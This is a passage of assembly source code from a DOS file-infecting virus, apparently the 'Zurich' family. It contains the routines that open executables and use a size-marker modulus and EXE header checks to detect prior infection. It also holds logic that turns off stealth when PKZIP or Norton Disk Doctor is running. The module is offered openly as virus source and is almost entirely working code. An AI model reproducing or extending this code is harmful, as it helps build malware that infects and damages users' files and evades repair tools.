INCLUDE ZURICH.ASI
code segment byte public
assume cs:code, ds:code, es:code, ss:code
STACKBASE       equ 080h
extrn restore_seek      :near
extrn save_seek         :near
extrn seek_end          :near
extrn dosseek_bof       :near
extrn DOSCALL            :near
extrn DosCall_exc        :near
extrn NOSTL21NAMES       :near
extrn           get_own_name        :near
extrn           get_crc_just_fname  :near
;extrn check_PROCESS_NAME :near
;extrn EXE_TEST_READ    :near
extrn start_data       :near
extrn dosclose         :near
extrn read_buf_22      :near

;public exe_test_read
;public IfInfectName
;public IfInfectHandle
;public IfInfectBuf
;public IfInfectNameCustom
;public exe_test
;public test_size

;-+------------------------------------------------------------------------+-
pblabel IfInfectName    ;ds:dx - filename ax - 3Dxx for open file
    mov     ax, 3D40h     ; open R/O file
pblabel IfInfectNameCustom
    mov     byte ptr cs:[ErrorRead], opCALL
    call    DosCall_exc       ; open file
         ;а если не откроется - очень плохо :(
         ;надо обязательно открыть (67h?)
;            push bx
    xchg    bx, ax
         call   seek_end
         call   test_size

;         jnz    ErrorRead


    jz      IfInfectHandle1
ErrorRead:
         call  dosclose  ; close file
         pop ax
         ret
;-+------------------------------------------------------------------------+-


pblabel IfInfectHandle
         mov    byte ptr cs:[ErrorRead], 0B8h ;don't close this file
IfInfectHandle1:
         MOVSEG ds, cs
         ;*****************test size


         mov       ax, 4400h        ; IOCTL test for file/stream
         call      DosCall     ;NDD: open 'CON' :)
         jc        ErrorRead        ;no file
         rol       dl, 1
         jc        ErrorRead        ;no file

         call   save_seek
;
;         call   seek_end
;         call   test_size
;         jnz    ErrorRead
;
         call   dosseek_bof
         call   read_buf_22
;         jc     ErrorRead
         call   restore_seek


pblabel IfInfectBuf
;if PKZIP, NDD (ZF=1) - no stealth
          push    ds dx
          call    get_own_name
          call    get_crc_just_fname
          pop     dx ds
          jz     ErrorRead
         call      exe_test
         jnz       ErrorRead         ;test for infect

         mov      ax, [exehdr.exe_CS]     ;later to ss:[ExeCS]
         add      ax, [exehdr.exe_par_dir]
         mov      cx, 10h
         mul      cx
         add      ax, [exehdr.exe_SP]
         sub      ax, STACKBASE-10h ;offset virus_start-10h          ;ax - original size
         cmp        ah, MININFECTSIZE/100h
         jb         ErrorRead
         test      al, 1
         jnz        ErrorRead
         ret
;IfInfectHandle endp
;-+------------------------------------------------------------------------+-



;-+------------------------------------------------------------------------+-
pblabel exe_test  ;-+------- test for already infect -> ZF=1 if infect
                                                   ;ZF=0 - no infected file
;     mov       ax, [exehdr.exe_SS]
;     inc       ax
;     sub       ax, [exehdr.exe_CS]
;     DOIF Z

     mov       al, [exehdr.exe_SS.h]
     sub       al, [exehdr.exe_CS.h]
     cmp       al, 17h
     DOIF BE
        mov     ax, [exehdr.exe_SP]
        and     ax, 0FFF0h
        sub     ax, STACKBASE
     DONE
     ret
;-+------------------------------------------------------------------------+-



;-+------------------------------------------------------------------------+-
pblabel test_size  ;ax-(file_size and 0FFFFh)
              ;-+------- test for already infect -> ZF=1 if possible infect
                                                   ;ZF=0 - no infected file
;for length with virus
         push   ax cx dx
         xor    dx, dx
         mov    cx, SIZEMARKER
         div    cx
         cmp    dx, SIZEMARKER_MOD
         pop    dx cx ax
         ret
;-+------------------------------------------------------------------------+-

ends
end
